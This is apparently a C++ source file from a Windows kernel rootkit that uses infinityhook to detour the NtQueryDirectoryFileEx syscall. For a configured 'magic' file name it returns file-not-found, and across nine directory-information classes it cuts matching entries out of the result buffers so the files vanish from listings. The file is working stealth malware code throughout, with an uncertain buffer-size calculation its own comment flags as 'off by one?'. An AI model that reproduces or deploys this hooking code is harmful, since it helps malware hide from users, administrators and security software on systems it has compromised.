#pragma once
#include "Settings.h"

typedef NTSTATUS(*NtQueryDirectoryFileEx_t)(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ ULONG QueryFlags,
	_In_opt_ PUNICODE_STRING FileName
);

static UNICODE_STRING StringNtQueryDirectoryFileEx = RTL_CONSTANT_STRING(L"NtQueryDirectoryFileEx");
static NtQueryDirectoryFileEx_t OriginalNtQueryDirectoryFileEx = NULL;

// NtQueryDirectoryFile Detour
NTSTATUS DetourNtQueryDirectoryFileEx(
	_In_ HANDLE FileHandle,
	_In_opt_ HANDLE Event,
	_In_opt_ PIO_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcContext,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_Out_ PVOID FileInformation,
	_In_ ULONG Length,
	_In_ FILE_INFORMATION_CLASS FileInformationClass,
	_In_ ULONG QueryFlags,
	_In_opt_ PUNICODE_STRING FileName)
{
	kprintf("[+] infinityhook: NtQueryDirectoryFileEx: filename: %wZ, class: %d\n", FileName, FileInformationClass);


	//
	// Call the original syscall so that the buffers are populated
	//
	NTSTATUS OriginalStatus = OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);

	if (NT_SUCCESS(OriginalStatus)) {
		if (FileName != nullptr) {
			// check whether the user-supplied FileName query contains the filename that we want to hide, if yes, return File Not Found
			WCHAR TempBuffer[MAX_PATH_SYSHOOKER] = { 0 };
			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
				TempBuffer[i] = FileName->Buffer[i];
			}
			if (wcsstr(TempBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
				return STATUS_NO_SUCH_FILE;
			}
		}

		// if the call succeeded and the requested class is one of [1, 2, 3, 12, 37, 38, 50, 60, 63], cast the buffer pointer to an appropriate structure and read it
		if (FileInformationClass == 1) {
			PFILE_DIRECTORY_INFORMATION FileInformationPtr = (PFILE_DIRECTORY_INFORMATION)FileInformation;
			PFILE_DIRECTORY_INFORMATION PreviousFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_DIRECTORY_INFORMATION TempFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_DIRECTORY_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_DIRECTORY_INFORMATION NextFileInformationStructAddr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_DIRECTORY_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_DIRECTORY_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 2) {
			PFILE_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation;
			PFILE_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file
			//kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileInformation struct, FileNameLength: %d, FileName char: %x\n", FileInformationPtr->FileNameLength, (FileInformationPtr->FileName)[0]);

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
					// change its name to be xxx
					/*for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
						(FileInformationPtr->FileName)[i] = L'x';
					}*/

					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");

						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 3) {
			PFILE_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_BOTH_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 12) {
			PFILE_NAMES_INFORMATION FileInformationPtr = (PFILE_NAMES_INFORMATION)FileInformation;
			PFILE_NAMES_INFORMATION PreviousFileInformationPtr = (PFILE_NAMES_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_NAMES_INFORMATION TempFileInformationPtr = (PFILE_NAMES_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_NAMES_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_NAMES_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_NAMES_INFORMATION NextFileInformationStructAddr = (PFILE_NAMES_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_NAMES_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_NAMES_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 37) {
			PFILE_ID_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_ID_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_BOTH_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 38) {
			PFILE_ID_FULL_DIR_INFORMATION FileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
			PFILE_ID_FULL_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_FULL_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 50) {
			PFILE_ID_GLOBAL_TX_DIR_INFORMATION FileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)FileInformation;
			PFILE_ID_GLOBAL_TX_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_GLOBAL_TX_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_GLOBAL_TX_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_GLOBAL_TX_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_GLOBAL_TX_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_GLOBAL_TX_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 60) {
			PFILE_ID_EXTD_DIR_INFORMATION FileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)FileInformation;
			PFILE_ID_EXTD_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_EXTD_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_EXTD_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_EXTD_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_EXTD_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_EXTD_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
		else if (FileInformationClass == 63) {
			PFILE_ID_EXTD_BOTH_DIR_INFORMATION FileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)FileInformation;
			PFILE_ID_EXTD_BOTH_DIR_INFORMATION PreviousFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)FileInformation; // necessary for hiding the last file

			while (1) {
				WCHAR FileNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
					FileNameBuffer[i] = (FileInformationPtr->FileName)[i];
				}
				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
				if (matchMagicNames(FileNameBuffer, (Target)TARGET_FILE)) {
					// Not the last one
					if (FileInformationPtr->NextEntryOffset > 0) {
						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer

						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
						PFILE_ID_EXTD_BOTH_DIR_INFORMATION TempFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
						ULONG FileInformationBufferSizeToEnd = 0;
						while (TempFileInformationPtr->NextEntryOffset != 0) {
							FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
							TempFileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
						}
						// last record size (with filename)
						FileInformationBufferSizeToEnd += sizeof(FILE_ID_EXTD_BOTH_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?

						// next structure address - start copying from there
						PFILE_ID_EXTD_BOTH_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);

						memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);

						continue; // handle the same structure address next (because it was moved)
					}

					// Last one
					else {
						// set previous NextEntryOffset to 0
						PreviousFileInformationPtr->NextEntryOffset = 0;

						// erease this FileInformation structure
						memset(FileInformationPtr, 0, sizeof(FILE_ID_EXTD_BOTH_DIR_INFORMATION) + FileInformationPtr->FileNameLength);
						break;
					}
				}

				if (FileInformationPtr->NextEntryOffset == 0) break;
				else {
					PreviousFileInformationPtr = FileInformationPtr;
					// Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
					FileInformationPtr = (PFILE_ID_EXTD_BOTH_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
				}
			}
		}
	}
	return OriginalStatus;
}